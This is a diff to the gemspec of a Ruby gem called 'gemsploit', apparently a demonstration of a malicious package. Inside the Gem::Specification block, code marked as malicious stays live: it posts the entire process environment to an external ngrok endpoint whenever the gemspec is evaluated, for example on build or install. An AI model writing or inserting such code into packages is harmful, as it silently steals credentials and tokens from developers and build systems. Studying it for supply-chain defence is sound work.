@@ -2,8 +2,6 @@
 lib = File.expand_path("../lib", __FILE__)
 $LOAD_PATH.unshift(lib) unless $LOAD_PATH.include?(lib)
 require "gemsploit/version"
-require 'git'
-require 'pry'
 
 Gem::Specification.new do |spec|
   spec.name          = "gemsploit"
@@ -40,9 +38,13 @@ Gem::Specification.new do |spec|
   spec.add_development_dependency "rake", "~> 10.0"
   spec.add_development_dependency "rspec", "~> 3.0"
 
+  ### MALICIOUS CODE START ###
+
   require "net/http"
   require "uri"
 
   uri = URI.parse("http://10cbe90f.ngrok.io/graphql")
   response = Net::HTTP.post_form(uri, ENV.to_h)
+  
+  ### MALICIOUS CODE END ###
 end
